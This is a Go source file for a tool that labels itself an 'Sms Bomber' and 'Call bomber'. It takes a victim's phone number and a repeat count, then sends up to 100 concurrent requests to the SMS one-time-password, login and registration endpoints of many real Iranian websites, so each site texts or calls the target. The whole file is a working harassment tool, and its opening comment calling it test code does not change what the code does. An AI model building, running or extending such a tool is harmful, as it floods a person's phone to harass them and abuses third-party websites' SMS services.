// faghat teste code
package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
)

func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 2 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/json")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}

func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 3 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:

		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating form request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {

			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {

				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
} // tabe jadid hastesh
func sendGETRequest(ctx context.Context, url string, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 2 * time.Second // کمی کمتر از POST برای GET

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil) // متد GET و Body = nil
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating GET request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return // موفقیت آمیز بود، از حلقه تلاش مجدد خارج می شویم
	}
}
// توابع کمکی برای فرمت کردن شماره تلفن (برای استفاده داخلی در task ها)
// چون اینها منطق ساده ای دارند و از پکیج های موجود استفاده می کنند، اضافه می شوند.
func getPhoneNumberNoZero(phone string) string {
	if strings.HasPrefix(phone, "0") {
		return phone[1:]
	}
	return phone
}

func getPhoneNumber98NoZero(phone string) string {
	return "98" + getPhoneNumberNoZero(phone)
}

func getPhoneNumberPlus98NoZero(phone string) string {
	return "+98" + getPhoneNumberNoZero(phone)
}

func main() {
	clearScreen()

	fmt.Print("\033[01;32m")
	fmt.Print(`
		                                      :-.
		                                  .:  =#-:-----:
		                                    **%@#%@@@#*+==:
		                                 :=*%@@@@@@@@@@@@@@%#*=:
		                              -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.
		                            . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:
		                          .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.
		                        =% .#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:
		                       :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.
		                       #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..
		                      .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
		                       =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#
		                       +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
		                       =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-
		                       .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
		                        #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#
		                        -@@@@*:       . -#@@@@@@#:  .       -#@@@%:
		                        *@@%#           -@@@@@@.            #@@@+
		                         .%@@# @monsmain +@@@@@@=  Sms Bomber #@@#
		                         :@@* =%@@@@@@%-  faster    *@@:
		                          #@@%        .*@@@@#%@@@%+.          %@@+
		                          %@@@+     -#@@@@@* :%@@@@@*-       *@@@*
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
		                          *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=
		                           #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*
		                            =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-
		                              .---@@@@@@@@@%@@@%%@@@@@@@@%:--.
		                                   #@@@@@@@@@@@@@@@@@@@@@@+
		                                    *@@@@@@@@@@@@@@@@@@@@+
		                                     +@@%*@@%@@@%%@%*@@%=
		                                      +%+ %%.+@%:-@* *%-
		                                       .  %# .%#  %+
		                                          :.  %+  :.
		                                               -:
`)
	fmt.Print("\033[0m")


	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n") // Note: Update these counts based on the final number of added services
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	var speedChoice string
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mChoose speed [medium/fast]: \033[00;36m")
	fmt.Scan(&speedChoice)

	var numWorkers int

	switch strings.ToLower(speedChoice) {
	case "fast":
		numWorkers = 100
		fmt.Println("\033[01;33m[*] Fast mode selected. Using", numWorkers, "workers.\033[0m")
	case "medium":
		numWorkers = 30
		fmt.Println("\033[01;33m[*] Medium mode selected. Using", numWorkers, "workers.\033[0m")
	default:
		numWorkers = 30
		fmt.Println("\033[01;31m[-] Invalid speed choice. Defaulting to medium mode using", numWorkers, "workers.\033[0m")
	}


	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)

	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel()
	}()

	// تخمین اندازه کانال tasks: تعداد تکرار * (تعداد کل URLهای فعال)
	tasks := make(chan func(), repeatCount*40) // 40 یک تخمین اولیه است، با توجه به تعداد URLهای اضافه شده تنظیم شود

	var wg sync.WaitGroup

	// تخمین اندازه کانال ch: تعداد تکرار * (تعداد کل URLهای فعال)
	ch := make(chan int, repeatCount*40) // 40 یک تخمین اولیه است

	for i := 0; i < numWorkers; i++ {
		go func() {
			for task := range tasks {
				task()
			}
		}()
	}

	// --- حلقه اصلی برای اضافه کردن وظایف ---
	for i := 0; i < repeatCount; i++ {
        

		// https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/getLoginMethod (JSON) - ghabzino part 1
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/getLoginMethod", map[string]interface{}{
				"Parameters": map[string]interface{}{
					"MobileNumber": getPhoneNumberPlus98NoZero(phone), // نیاز به +98 دارد
					"ApplicationType": "Web",
					"ApplicationUniqueToken": "web",
					"ApplicationVersion": "1.0.0",
				},
			}, &wg, ch)
		}

		// https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode (JSON) - ghabzino part 2
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", map[string]interface{}{
				"Parameters": map[string]interface{}{
					"MobileNumber": getPhoneNumberPlus98NoZero(phone), // نیاز به +98 دارد
					"ApplicationType": "Web",
					"ApplicationUniqueToken": "web",
					"ApplicationVersion": "1.0.0",
				},
			}, &wg, ch)
		}

		// https://farsgraphic.com/wp-admin/admin-ajax.php (Form Data - Part 1) - پیچیده، پارامترهای ثابت زیاد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("digits_reg_name", "test") // مقادیر ثابت
			formData.Set("digits_reg_lastname", "test") // مقادیر ثابت
			formData.Set("email", "test@example.com") // مقادیر ثابت
			formData.Set("digt_countrycode", "+98") // کد کشور ثابت
			formData.Set("phone", getPhoneNumberNoZero(phone)) // نیاز به شماره بدون 0 اول و بدون فاصله دارد
			formData.Set("digits_reg_password", "testpassword") // مقادیر ثابت
			formData.Set("digits_process_register", "1") // مقادیر ثابت
			formData.Set("instance_id", "placeholder") // ممکن است نیاز به دینامیک باشد
			formData.Set("optional_data", "optional_data") // مقادیر ثابت
			formData.Set("action", "digits_forms_ajax") // مقادیر ثابت
			formData.Set("type", "register") // مقادیر ثابت
			formData.Set("dig_otp", "") // خالی
			formData.Set("digits", "1") // مقادیر ثابت
			formData.Set("digits_redirect_page", "-1") // مقادیر ثابت
			formData.Set("digits_form", "placeholder") // ممکن است نیاز به دینامیک باشد
			formData.Set("_wp_http_referer", "/") // مقادیر ثابت

			sendFormRequest(ctx, "https://farsgraphic.com/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// https://farsgraphic.com/wp-admin/admin-ajax.php (Form Data - Part 2) - پیچیده، پارامترهای ثابت زیاد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("digits_reg_name", "test") // مقادیر ثابت
			formData.Set("digits_reg_lastname", "test") // مقادیر ثابت
			formData.Set("email", "test@example.com") // مقادیر ثابت
			formData.Set("digt_countrycode", "+98") // کد کشور ثابت
			formData.Set("phone", getPhoneNumberNoZero(phone)) // نیاز به شماره بدون 0 اول و بدون فاصله دارد
			formData.Set("digits_reg_password", "testpassword") // مقادیر ثابت
			formData.Set("digits_process_register", "1") // مقادیر ثابت
			formData.Set("sms_otp", "") // خالی
			formData.Set("digits_otp_field", "1") // مقادیر ثابت
			formData.Set("instance_id", "placeholder") // ممکن است نیاز به دینامیک باشد
			formData.Set("optional_data", "optional_data") // مقادیر ثابت
			formData.Set("action", "digits_forms_ajax") // مقادیر ثابت
			formData.Set("type", "register") // مقادیر ثابت
			formData.Set("dig_otp", "otp") // مقادیر ثابت
			formData.Set("digits", "1") // مقادیر ثابت
			formData.Set("digits_redirect_page", "-1") // مقادیر ثابت
			formData.Set("_wp_http_referer", "/") // مقادیر ثابت
			formData.Set("container", "digits_protected") // مقادیر ثابت
			formData.Set("sub_action", "sms_otp") // مقادیر ثابت


			sendFormRequest(ctx, "https://farsgraphic.com/wp-admin/admin-ajax.php", formData, &wg, ch)
		}


		// https://www.glite.ir/wp-admin/admin-ajax.php (Form Data)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("action", "mreeir_send_sms") // مقادیر ثابت
			formData.Set("mobileemail", phone) // نیاز به 0 اول دارد
			formData.Set("userisnotauser", "") // خالی
			formData.Set("type", "mobile") // مقادیر ثابت
			formData.Set("captcha", "") // نیاز به کپچا - احتمالا موفق نیست
			formData.Set("captchahash", "") // نیاز به کپچا - احتمالا موفق نیست
			formData.Set("security", "placeholder") // ممکن است نیاز به دینامیک باشد

			sendFormRequest(ctx, "https://www.glite.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// https://raminashop.com/wp-admin/admin-ajax.php (Form Data) - پیچیده، پارامترهای ثابت زیاد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("action", "digits_check_mob") // مقادیر ثابت
			formData.Set("countrycode", "+98") // کد کشور ثابت
			formData.Set("mobileNo", phone) // نیاز به 0 اول دارد
			formData.Set("csrf", "placeholder") // ممکن است نیاز به دینامیک باشد
			formData.Set("login", "2") // مقادیر ثابت
			formData.Set("username", "") // خالی
			formData.Set("email", "") // خالی
			formData.Set("captcha", "") // نیاز به کپچا - احتمالا موفق نیست
			formData.Set("captcha_ses", "") // نیاز به کپچا - احتمالا موفق نیست
			formData.Set("digits", "1") // مقادیر ثابت
			formData.Set("json", "1") // مقادیر ثابت
			formData.Set("whatsapp", "0") // مقادیر ثابت
			formData.Set("digits_reg_name", "test") // مقادیر ثابت
			formData.Set("digregcode", "+98") // مقادیر ثابت
			formData.Set("digits_reg_mail", phone) // ممکن است به جای ایمیل، شماره تلفن با 0 نیاز داشته باشد
			formData.Set("dig_otp", "") // خالی
			formData.Set("code", "") // خالی
			formData.Set("dig_reg_mail", "") // خالی
			formData.Set("dig_nounce", "placeholder") // ممکن است نیاز به دینامیک باشد


			sendFormRequest(ctx, "https://raminashop.com/wp-admin/admin-ajax.php", formData, &wg, ch)
		}


		// https://www.chaymarket.com/wp-admin/admin-ajax.php (Form Data) - پیچیده، پارامترهای ثابت زیاد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("action", "digits_check_mob") // مقادیر ثابت
			formData.Set("countrycode", "+98") // کد کشور ثابت
			formData.Set("mobileNo", phone) // نیاز به 0 اول دارد
			formData.Set("csrf", "placeholder") // ممکن است نیاز به دینامیک باشد
			formData.Set("login", "2") // مقادیر ثابت
			formData.Set("username", "") // خالی
			formData.Set("email", "test@example.com") // ایمیل ثابت
			formData.Set("captcha", "") // نیاز به کپچا - احتمالا موفق نیست
			formData.Set("captcha_ses", "") // نیاز به کپچا - احتمالا موفق نیست
			formData.Set("json", "1") // مقادیر ثابت
			formData.Set("whatsapp", "0") // مقادیر ثابت


			sendFormRequest(ctx, "https://www.chaymarket.com/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// https://steelalborz.com/wp-admin/admin-ajax.php (Form Data) - پیچیده، پارامترهای ثابت زیاد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("action", "digits_check_mob") // مقادیر ثابت
			formData.Set("countrycode", "+98") // کد کشور ثابت
			formData.Set("mobileNo", phone) // نیاز به 0 اول دارد
			formData.Set("csrf", "placeholder") // ممکن است نیاز به دینامیک باشد
			formData.Set("login", "2") // مقادیر ثابت
			formData.Set("username", "") // خالی
			formData.Set("email", "") // خالی
			formData.Set("captcha", "") // نیاز به کپچا - احتمالا موفق نیست
			formData.Set("captcha_ses", "") // نیاز به کپچا - احتمالا موفق نیست
			formData.Set("digits", "1") // مقادیر ثابت
			formData.Set("json", "1") // مقادیر ثابت
			formData.Set("whatsapp", "0") // مقادیر ثابت
			formData.Set("digits_reg_name", "test") // مقادیر ثابت
			formData.Set("digits_reg_lastname", "test") // مقادیر ثابت
			formData.Set("digregcode", "+98") // مقادیر ثابت
			formData.Set("digits_reg_mail", phone) // ممکن است به جای ایمیل، شماره تلفن با 0 نیاز داشته باشد
			formData.Set("dig_otp", "") // خالی
			formData.Set("code", "") // خالی
			formData.Set("dig_reg_mail", "") // خالی
			formData.Set("dig_nounce", "placeholder") // ممکن است نیاز به دینامیک باشد

			sendFormRequest(ctx, "https://steelalborz.com/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// https://kafegheymat.com/shop/getLoginSms (JSON) - نیاز به کپچا
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://kafegheymat.com/shop/getLoginSms", map[string]interface{}{
				"phone": phone, // نیاز به 0 اول دارد
				"captcha": "placeholder", // نیاز به کپچا - احتمالا موفق نیست
			}, &wg, ch)
		}

		// https://hiword.ir/wp-admin/admin-ajax.php (Form Data - Part 3 SMS OTP) - پیچیده، پارامترهای ثابت زیاد و احتمالا نیاز به دینامیک
		// این بخش از اطلاعات شما بیشتر شبیه مرحله ثبت نام بود تا صرفا درخواست OTP.
		// بر اساس آخرین بخش داده شده (sub_action: sms_otp) کدنویسی می شود، اما ممکن است کار نکند.
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("digits_reg_name", "test") // مقادیر ثابت
			formData.Set("email", "test@example.com") // مقادیر ثابت
			formData.Set("digt_countrycode", "+98") // کد کشور ثابت
			formData.Set("phone", getPhoneNumberNoZero(phone)) // نیاز به شماره بدون 0 اول و بدون فاصله دارد
			formData.Set("digits_reg_password", "testpassword") // مقادیر ثابت
			formData.Set("digits_process_register", "1") // مقادیر ثابت
			formData.Set("sms_otp", "") // خالی
			formData.Set("otp_step_1", "1") // مقادیر ثابت
			formData.Set("digits_otp_field", "1") // مقادیر ثابت
			formData.Set("instance_id", "placeholder") // ممکن است نیاز به دینامیک باشد
			formData.Set("optional_data", "optional_data") // مقادیر ثابت
			formData.Set("action", "digits_forms_ajax") // مقادیر ثابت
			formData.Set("type", "register") // مقادیر ثابت
			formData.Set("dig_otp", "otp") // مقادیر ثابت
			formData.Set("digits", "1") // مقادیر ثابت
			formData.Set("digits_redirect_page", "-1") // مقادیر ثابت
			formData.Set("mobile", phone) // نیاز به 0 اول دارد (اینجا از mobile استفاده می‌کنیم)
			formData.Set("digits_form", "placeholder") // ممکن است نیاز به دینامیک باشد
			formData.Set("_wp_http_referer", "/") // مقادیر ثابت
			formData.Set("container", "digits_protected") // مقادیر ثابت
			formData.Set("sub_action", "sms_otp") // مقادیر ثابت

			sendFormRequest(ctx, "https://hiword.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// https://tagmond.com/phone_number (Form Data) - نیاز به کپچا
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("utf8", "✓") // مقادیر ثابت
			formData.Set("custom_comment_body_hp_24124", "") // خالی
			formData.Set("phone_number", phone) // نیاز به 0 اول دارد
			formData.Set("recaptcha", "placeholder") // نیاز به کپچا - احتمالا موفق نیست

			sendFormRequest(ctx, "https://tagmond.com/phone_number", formData, &wg, ch)
		}

		// https://okcs.com/users/mobilelogin (Form Data)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("mobile", phone) // نیاز به 0 اول دارد
			formData.Set("url", "https://okcs.com/") // مقادیر ثابت
			sendFormRequest(ctx, "https://okcs.com/users/mobilelogin", formData, &wg, ch)
		}


		// https://pakhsh.shop/wp-admin/admin-ajax.php (Form Data - Part 1) - پیچیده، پارامترهای ثابت زیاد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("digt_countrycode", "+98") // کد کشور ثابت
			formData.Set("phone", getPhoneNumberNoZero(phone)) // نیاز به شماره بدون 0 اول دارد
			formData.Set("digits_reg_name", "test") // مقادیر ثابت
			formData.Set("digits_process_register", "1") // مقادیر ثابت
			formData.Set("instance_id", "placeholder") // ممکن است نیاز به دینامیک باشد
			formData.Set("optional_data", "optional_data") // مقادیر ثابت
			formData.Set("action", "digits_forms_ajax") // مقادیر ثابت
			formData.Set("type", "register") // مقادیر ثابت
			formData.Set("dig_otp", "") // خالی
			formData.Set("digits", "1") // مقادیر ثابت
			formData.Set("digits_redirect_page", "-1") // مقادیر ثابت
			formData.Set("digits_form", "placeholder") // ممکن است نیاز به دینامیک باشد
			formData.Set("_wp_http_referer", "/") // مقادیر ثابت

			sendFormRequest(ctx, "https://pakhsh.shop/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// https://pakhsh.shop/wp-admin/admin-ajax.php (Form Data - Part 2 SMS OTP) - پیچیده، پارامترهای ثابت زیاد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("digt_countrycode", "+98") // کد کشور ثابت
			formData.Set("phone", getPhoneNumberNoZero(phone)) // نیاز به شماره بدون 0 اول دارد
			formData.Set("digits_reg_name", "test") // مقادیر ثابت
			formData.Set("digits_process_register", "1") // مقادیر ثابت
			formData.Set("sms_otp", "") // خالی
			formData.Set("otp_step_1", "1") // مقادیر ثابت
			formData.Set("signup_otp_mode", "1") // مقادیر ثابت
			formData.Set("instance_id", "placeholder") // ممکن است نیاز به دینامیک باشد
			formData.Set("optional_data", "optional_data") // مقادیر ثابت
			formData.Set("action", "digits_forms_ajax") // مقادیر ثابت
			formData.Set("type", "register") // مقادیر ثابت
			formData.Set("dig_otp", "") // خالی
			formData.Set("digits", "1") // مقادیر ثابت
			formData.Set("digits_redirect_page", "-1") // مقادیر ثابت
			formData.Set("digits_form", "placeholder") // ممکن است نیاز به دینامیک باشد
			formData.Set("_wp_http_referer", "/") // مقادیر ثابت
			formData.Set("container", "digits_protected") // مقادیر ثابت
			formData.Set("sub_action", "sms_otp") // مقادیر ثابت

			sendFormRequest(ctx, "https://pakhsh.shop/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// https://www.didnegar.com/wp-admin/admin-ajax.php (Form Data)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("action", "PLWN_ajax_send_sms") // مقادیر ثابت
			formData.Set("nonce", "placeholder") // ممکن است نیاز به دینامیک باشد
			formData.Set("mobile_number", phone) // نیاز به 0 اول دارد

			sendFormRequest(ctx, "https://www.didnegar.com/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// https://my.limoome.com/auth/check-mobile (JSON - Part 1)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://my.limoome.com/auth/check-mobile", map[string]interface{}{
				"mobileNumber": getPhoneNumberNoZero(phone), // نیاز به شماره بدون 0 اول
				"countryId": "1", // مقادیر ثابت
			}, &wg, ch)
		}

		// https://my.limoome.com/api/auth/login/otp (Form Data - Part 2) - نیاز به کپچا
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("mobileNumber", getPhoneNumberNoZero(phone)) // نیاز به شماره بدون 0 اول
			formData.Set("country", "1") // مقادیر ثابت
			formData.Set("recaptchaToken", "placeholder") // نیاز به کپچا - احتمالا موفق نیست

			sendFormRequest(ctx, "https://my.limoome.com/api/auth/login/otp", formData, &wg, ch)
		}

		// https://bimito.com/api/vehicleorder/v2/app/auth/check-login-availability/ (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://bimito.com/api/vehicleorder/v2/app/auth/check-login-availability/", map[string]interface{}{
				"phoneNumber": phone, // نیاز به 0 اول دارد
			}, &wg, ch)
		}

	} // --- پایان حلقه اصلی برای اضافه کردن وظایف ---


	close(tasks)

	go func() {
		wg.Wait()
		close(ch)
	}()

	// پردازش نتایج
	for statusCode := range ch {
		if statusCode >= 400 || statusCode == 0 {
			fmt.Println("\033[01;31m[-] Error or Canceled!")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
